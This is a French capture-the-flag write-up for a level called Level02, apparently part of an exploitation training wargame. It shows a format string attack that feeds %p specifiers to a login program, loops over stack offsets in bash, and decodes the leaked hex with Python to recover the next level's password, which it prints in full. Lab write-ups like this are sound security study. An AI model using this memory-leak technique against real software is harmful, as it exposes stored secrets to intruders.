## Level02

En le lançant le programme nous demande d'entrée un nom d'utilisateur et un mot de pass. 

    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: login
    --[ Password: pass
    *****************************************
    login does not have access!


Quoi que l'ont mettent on nous dit que nous n'avons pas les accès.

Dans le programme nous trouvons un printf, il va donc falloir utiliser une *format string attack*.

En décortiquant le code on s’aperçoit que le .pass qui est open est garder dans un buffer lorsqu'on lance le programme.

Grâce au printf plus bas, nous pouvons donc essayer d'afficher la stack, pour ça nous allons utiliser le paramètre de printf %p.

Ce qui nous donne :

    /***************************************\
    | You must login to access this system. |
    \**************************************/
    --[ Username: %1$p
    --[ Password:
    *****************************************
    0x7fffffffe510 does not have access!
On à donc la première adresse de la stack, bien, maintenant automatisons ça pour le reste.

     for((i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 ;done

On ajoute un grep pour que ce soit plus lisible. 

     for((i = 1; i < 30; i++)); do echo "$i - %$i\$p" | ./level02 | grep not ;done

    18 - (nil) does not have access!
    19 - (nil) does not have access!
    20 - 0x100000000 does not have access!
    21 - (nil) does not have access!
    22 - 0x756e505234376848 does not have access!
    23 - 0x45414a3561733951 does not have access!
    24 - 0x377a7143574e6758 does not have access!
    25 - 0x354a35686e475873 does not have access!
    26 - 0x48336750664b394d does not have access!
    27 - (nil) does not have access!
    28 - 0x383225202d203832 does not have access!
    29 - 0x7024 does not have access!

On remarque que il y a 5 valeur qui on l'air particulières. On sait que le token fait 40 caractères, donc on en déduit que nos 5 valeurs trouver dans la stack peuvent correspondre à notre token. Puisque 5 * 8 = 40.

On prend donc toutes ces valeurs et on les passes dans un convertisseur hex to ascii.
En utilisant python on obtient : 

    $ python -c 'print "756e505234376848".decode("hex")[::-1]'
    Hh74RPnu
    $ python -c 'print "45414a3561733951".decode("hex")[::-1]'
    Q9sa5JAE
    $ python -c 'print "377a7143574e6758".decode("hex")[::-1]'
    XgNWCqz7
    $ python -c 'print "354a35686e475873".decode("hex")[::-1]'
    sXGnh5J5
    $ python -c 'print "48336750664b394d".decode("hex")[::-1]'
    M9KfPg3H

  Le [::-1] permet de reverse la string, puisqu'elle nous est donnée depuis la stack.

Le password du level03 est donc :

    Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H


 




